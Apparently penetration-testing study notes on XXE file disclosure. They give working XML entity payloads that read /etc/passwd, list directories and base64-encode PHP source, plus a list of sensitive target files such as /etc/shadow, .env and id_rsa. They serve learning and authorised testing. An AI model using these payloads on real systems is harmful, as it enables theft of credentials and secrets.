# File Disclosure

Initial Goal: Identify XML injection point and leak local files via XXE.
#### 1. Detecting Vulnerability

- Intercept request with XML payload.    
- Inject test entity:

```xml
<!DOCTYPE email [ <!ENTITY test "INJECTED"> ]>
<email>&test;</email>
```

- If `INJECTED` is reflected, XXE is possible.    

Use Burp Inspector to identify reflected fields. Inject only into those fields (e.g., `<email>`, `<name>`).
#### 2. Read Local File (Basic)

- Inject external entity referencing a local file:

```xml
<!DOCTYPE email [
<!ENTITY xxe SYSTEM "file:///etc/passwd">
]>
<email>&xxe;</email>
```

- If vulnerable, server returns file contents.    

Useful UNIX files:

- `/etc/passwd` (proof of concept)
- `/etc/hostname`, `/etc/shadow`, `.bash_history`, `.env`, `id_rsa`

Useful Windows files:

- `file:///C:/Windows/win.ini`    
- `file:///C:/xampp/apache/logs/access.log`
#### 3. Handling Parser Breakage (Base64 Bypass)

Files with special characters (`<`, `>`, `&`) break XML. Use PHP filter wrapper to base64-encode them.

```xml
<!DOCTYPE email [
  <!ENTITY xxe SYSTEM "php://filter/convert.base64-encode/resource=index.php">
]>
<email>&xxe;</email>
```

Decode base64 manually or via Burp → Inspector → Decode → base64.

> Only works on PHP apps.

#### 4. Force XML Parsing (when JSON used)

- Change `Content-Type` to `application/xml`    
- Convert JSON to XML (e.g., `convertjson.com`)
- Inject payload as above

Many APIs accept XML behind the scenes even if they expose JSON.
#### 5. Directory Read (Java-specific behavior)

Some Java-based XML parsers return directory listings:

```xml
<!DOCTYPE email [
  <!ENTITY xxe SYSTEM "file:///var/www/html/">
]>
<email>&xxe;</email>
```

Response may list files in the directory. Follow up with specific file reads.

#### 6. Notes on Entity Placement

- If request has no `<!DOCTYPE>`, inject your own at the top    
- If request has existing `<!DOCTYPE>`, inject entity inside it
- Use fields that reflect data — blind injection fails unless output is shown
